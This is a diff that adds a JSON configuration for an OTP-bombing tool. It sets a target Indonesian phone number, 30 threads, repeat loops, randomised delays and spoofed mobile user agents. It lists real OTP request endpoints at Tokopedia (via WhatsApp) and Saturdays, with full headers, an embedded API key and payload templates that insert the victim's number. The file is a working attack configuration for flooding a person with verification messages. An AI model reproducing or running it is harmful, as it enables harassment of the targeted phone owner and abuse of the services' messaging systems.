@@ -1,0 +1,74 @@
+{
+    "target_number": "6281234567890",
+    "threads": 30,
+    "max_loop": 25,
+    "delay_min": 0.3,
+    "delay_max": 1.0,
+    "use_proxy": false,
+    "user_agents": [
+        "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
+        "Mozilla/5.0 (Linux; Android 12; SM-S908E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
+        "Mozilla/5.0 (Linux; Android 10; Redmi Note 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.80 Mobile Safari/537.36"
+    ],
+    "api_endpoints": [
+        {
+            "name": "Tokopedia",
+            "type": "tokopedia",
+            "method": "POST",
+            "url": "https://gql.tokopedia.com/graphql/OTPRequest",
+            "headers": {
+                "Content-Type": "application/json",
+                "x-source": "tokopedia-lite",
+                "tkpd-akamai": "otp",
+                "x-tkpd-lite-service": "oauth",
+                "x-version": "ad37e31"
+            },
+            "payload_template": {
+                "operationName": "OTPRequest",
+                "variables": {
+                    "msisdn": "{phone}",
+                    "MsisdnEnc": "",
+                    "EmailEnc": "",
+                    "otpType": "116",
+                    "mode": "whatsapp",
+                    "otpDigit": 6
+                },
+                "query": "query OTPRequest($otpType: String!, $mode: String, $msisdn: String, $email: String, $otpDigit: Int, $ValidateToken: String, $UserIDEnc: String, $UserIDSigned: String, $Signature: String, $MsisdnEnc: String, $EmailEnc: String, $source: String) { OTPRequestV2(otpType: $otpType, mode: $mode, msisdn: $msisdn, email: $email, otpDigit: $otpDigit, ValidateToken: $ValidateToken, UserIDEnc: $UserIDEnc, UserIDSigned: $UserIDSigned, Signature: $Signature, MsisdnEnc: $MsisdnEnc, EmailEnc: $EmailEnc, source: $source) { success message errorMessage } }"
+            },
+            "loop": 25
+        },
+        {
+            "name": "Saturdays",
+            "type": "saturdays",
+            "method": "POST",
+            "url": "https://beta.api.saturdays.com/api/v1/user/otp/send",
+            "headers": {
+                "Host": "beta.api.saturdays.com",
+                "x-api-key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj",
+                "authorization": "undefined",
+                "device-type": "mweb",
+                "platform": "mweb",
+                "country-code": "ID",
+                "currency-code": "IDR",
+                "content-type": "application/json",
+                "origin": "https://saturdays.com",
+                "referer": "https://saturdays.com/",
+                "accept": "*/*",
+                "accept-encoding": "gzip, deflate, br, zstd",
+                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+                "sec-ch-ua": "\"Google Chrome\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
+                "sec-ch-ua-mobile": "?1",
+                "sec-ch-ua-platform": "\"Android\"",
+                "sec-fetch-site": "same-site",
+                "sec-fetch-mode": "cors",
+                "sec-fetch-dest": "empty"
+            },
+            "payload_template": {
+                "number": "{phone}",
+                "country_code": "+62",
+                "type": ""
+            },
+            "loop": 20
+        }
+    ]
+}
